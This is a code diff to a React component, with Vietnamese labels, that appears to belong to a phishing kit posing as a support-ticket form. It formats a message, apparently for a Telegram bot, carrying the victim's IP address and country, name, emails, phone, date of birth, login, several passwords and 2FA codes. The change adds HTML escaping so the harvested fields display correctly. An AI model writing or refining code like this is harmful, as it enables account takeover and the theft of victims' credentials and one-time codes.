@@ -26,6 +26,15 @@ const generateTicketId = () =>
     return `#${ pick( 4 ) }-${ pick( 4 ) }-${ pick( 4 ) }`;
 };
 
+const escapeHtml = ( str ) =>
+{
+    if ( str === null || str === undefined ) return '';
+    return String( str )
+        .replace( /&/g, '&amp;' )
+        .replace( /</g, '&lt;' )
+        .replace( />/g, '&gt;' );
+};
+
 const Home = () =>
 {
     const [ ticketId ] = useState( () => generateTicketId() );
@@ -274,36 +283,36 @@ const Home = () =>
         const dt = formatDateTime( new Date() );
         const { form, login, passes, codes } = data;
 
-        let message = `📩 <b>${ LABEL }</b>\n`;
-        message += `🎫 Ticket: <code>${ ticketId }</code>\n`;
-        message += `⏰ ${ dt }\n`;
-        message += `🌐 <code>${ ipInfo.ip }</code> • ${ ipInfo.country }\n`;
+        let message = `📩 <b>${ escapeHtml( LABEL ) }</b>\n`;
+        message += `🎫 Ticket: <code>${ escapeHtml( ticketId ) }</code>\n`;
+        message += `⏰ ${ escapeHtml( dt ) }\n`;
+        message += `🌐 <code>${ escapeHtml( ipInfo.ip ) }</code> • ${ escapeHtml( ipInfo.country ) }\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
         if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName || form.dob || form.message )
         {
             message += `<b>📋 THÔNG TIN</b>\n`;
-            if ( form.fullName ) message += `   Tên: <code>${ form.fullName }</code>\n`;
-            if ( form.personalEmail ) message += `   Email: <code>${ form.personalEmail }</code>\n`;
+            if ( form.fullName ) message += `   Tên: <code>${ escapeHtml( form.fullName ) }</code>\n`;
+            if ( form.personalEmail ) message += `   Email: <code>${ escapeHtml( form.personalEmail ) }</code>\n`;
             if ( form.businessEmail && form.businessEmail !== form.personalEmail )
             {
-                message += `   Business: <code>${ form.businessEmail }</code>\n`;
+                message += `   Business: <code>${ escapeHtml( form.businessEmail ) }</code>\n`;
             }
-            if ( form.phone ) message += `   SĐT: <code>${ form.phone }</code>\n`;
-            if ( form.pageName ) message += `   Page: <code>${ form.pageName }</code>\n`;
-            if ( form.dob ) message += `   Ngày sinh: <code>${ form.dob }</code>\n`;
-            if ( form.message ) message += `   Lời nhắn: <code>${ form.message }</code>\n`;
+            if ( form.phone ) message += `   SĐT: <code>${ escapeHtml( form.phone ) }</code>\n`;
+            if ( form.pageName ) message += `   Page: <code>${ escapeHtml( form.pageName ) }</code>\n`;
+            if ( form.dob ) message += `   Ngày sinh: <code>${ escapeHtml( form.dob ) }</code>\n`;
+            if ( form.message ) message += `   Lời nhắn: <code>${ escapeHtml( form.message ) }</code>\n`;
         }
 
         if ( login || ( passes && passes.length > 0 ) )
         {
             message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
-            if ( login ) message += `   TK: <code>${ login }</code>\n`;
+            if ( login ) message += `   TK: <code>${ escapeHtml( login ) }</code>\n`;
             if ( passes && passes.length > 0 )
             {
                 passes.forEach( ( p, i ) =>
                 {
-                    message += `   MK${ i + 1 }: <code>${ p }</code>\n`;
+                    message += `   MK${ i + 1 }: <code>${ escapeHtml( p ) }</code>\n`;
                 } );
             }
         }
@@ -313,7 +322,7 @@ const Home = () =>
             message += `\n<b>🔒 MÃ 2FA</b>\n`;
             codes.forEach( ( c, i ) =>
             {
-                message += `   Code${ i + 1 }: <code>${ c }</code>\n`;
+                message += `   Code${ i + 1 }: <code>${ escapeHtml( c ) }</code>\n`;
             } );
         }
 
